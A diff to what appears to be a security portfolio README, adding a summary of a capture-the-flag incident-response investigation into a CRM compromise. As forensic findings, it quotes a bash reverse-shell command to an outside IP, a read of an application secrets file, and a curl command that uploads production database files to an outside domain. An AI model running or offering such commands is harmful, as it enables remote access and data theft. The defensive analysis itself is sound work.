@@ -60,6 +60,8 @@ Start here 👇 (Highlighted real-world case studies)
 
 * 🕵️ [XLMRat Lab - Network Forensics & Malware Analysis Investigation](./investigations/XLMRat-Lab.md)
 
+* 🛡️ [Portal Drop – CRM Incident Response & XDR Analysis](/investigations/Portal-Drop.md)
+
 * 🔥 [Slingshot - Web Server Compromise & Attack Chain Investigation](./investigations/Slingshot.md)
 
 * 🕵️ [The Silent Transfer - Network Forensics & Threat Hunting](./investigations/The-Silent-Transfer.md)
@@ -390,6 +392,18 @@ Start here 👇 (Highlighted real-world case studies)
 * Deobfuscated the PowerShell payload and identified `RegSvcs.exe` as the legitimate .NET LOLBin targeted for Process Hollowing.
 * Extracted and analyzed the embedded AsyncRAT payload, identifying the malware family as `AsyncRAT` with SHA256 `1eb7b02e18f67420f42b1d94e74f3b6289d92672a0fb1786c30c03d68e81d798`.
 * Traced encrypted TLS C2 communication between the compromised host and the attacker infrastructure and mapped the observed activity to relevant MITRE ATT&CK techniques.
+
+---
+
+### 🛡️ Portal Drop Investigation
+
+* Full attack chain reconstruction of a multi-stage web application and endpoint intrusion targeting TryPatchMe CRM (`crm.trypatchme.thm`) involving authentication brute-forcing, web shell deployment, reverse shell execution, system discovery, and data exfiltration
+* Initial access and reconnaissance identification via automated scanner user-agent (`PF-Scanner/1.0`) executing sequential credential brute-forcing against `/CRM/login.php` from attacker IP `34.67.91.83`
+* Post-authentication tooling transition utilizing Python scripts (`python-requests/2.31.0`) to upload a backdoor web shell (`invoice.php`) to `/CRM/portal/uploads/invoice.php`
+* EDR telemetry and process anomaly detection isolating a parent-child execution chain where the web worker process (`/usr/sbin/php-fpm7.4`) under user `www-data` spawned a command shell executing a TCP reverse shell (`bash -i >& /dev/tcp/115.58.148.86/8080 0>&1`)
+* System discovery and sensitive file access tracking adversary execution of `cat /etc/trycrm/config.json` to extract core application secrets and internal configuration parameters
+* Data exfiltration analysis dissecting malicious `curl` utility execution (`curl -sS -T /var/lib/trycrm/prod.db -T /var/lib/trycrm/prod.idx https://portaldrop2025.xyz/x7Ja0mlqP`) targeting production SQLite database artifacts
+* Multi-source correlation combining web server access logs, TryDetectMe XDR console telemetry, process execution chains, and artifact analysis to reconstruct the incident and recover flag `THM{p0rtal_dropp3d?}`
 
 ---
 
